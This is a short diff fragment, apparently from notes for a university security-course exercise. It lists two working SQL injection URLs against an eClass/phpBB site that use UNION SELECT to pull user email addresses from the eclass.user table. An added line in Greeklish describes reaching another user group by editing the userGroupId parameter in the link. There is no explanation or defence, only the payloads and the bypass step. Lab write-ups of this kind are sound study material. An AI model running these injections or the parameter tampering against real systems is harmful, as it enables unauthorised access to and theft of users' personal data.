@@ -18,3 +18,4 @@ criss
 http://the-intruders.csec.chatzi.org/modules/phpbb/viewtopic.php?topic=1%20AND%20FALSE=TRUE)%20UNION%20(SELECT%201,email%20FROM%20eclass.user%20where%20user_id=%207)%20--%20&forum=2
 
 http://the-intruders.csec.chatzi.org/modules/group/document.php?userGroupId=1&createDir=the-intruders'%20and%20TRUE=FALSE%20union%20select%20email%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--
+Kanoume login me enan aplo xrhsth phgainoume sthn omada xrhstwn kanoume eggrafh sthn omada kai vazoume sto userGroupId (sto link) ton arithmo 1 an anaferomaste sth prwth omada, kok
